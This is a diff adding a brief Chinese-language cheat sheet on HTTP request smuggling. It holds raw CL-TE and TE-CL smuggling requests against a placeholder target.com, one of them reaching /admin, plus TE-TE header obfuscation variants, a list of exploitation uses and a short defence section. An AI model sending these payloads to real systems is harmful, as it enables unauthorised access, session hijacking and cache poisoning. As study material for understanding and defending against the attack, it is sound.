@@ -1,0 +1,47 @@
+# HTTP 请求走私
+
+## 原理
+前端代理(LB/CDN)与后端对 HTTP 解析差异
+
+## CL-TE
+前端用 Content-Length，后端用 Transfer-Encoding
+```http
+POST / HTTP/1.1
+Content-Length: 44
+Transfer-Encoding: chunked
+
+0
+
+GET /admin HTTP/1.1
+Host: target.com
+```
+
+## TE-CL
+前端用 Transfer-Encoding，后端用 Content-Length
+```http
+POST / HTTP/1.1
+Content-Length: 4
+Transfer-Encoding: chunked
+
+5c
+POST /smuggle HTTP/1.1
+Host: target.com
+Content-Length: 15
+
+x=1
+0
+```
+
+## TE-TE
+对 Transfer-Encoding 值的解析差异
+```
+Transfer-Encoding: xchunked
+Transfer-Encoding: chunked
+Transfer-Encoding:[tab]chunked
+```
+
+## 利用
+会话劫持、XSS绕过CSP、缓存投毒、权限绕过
+
+## 防御
+统一 HTTP 解析器、禁用 HTTP/1.1 降级、使用 HTTP/2
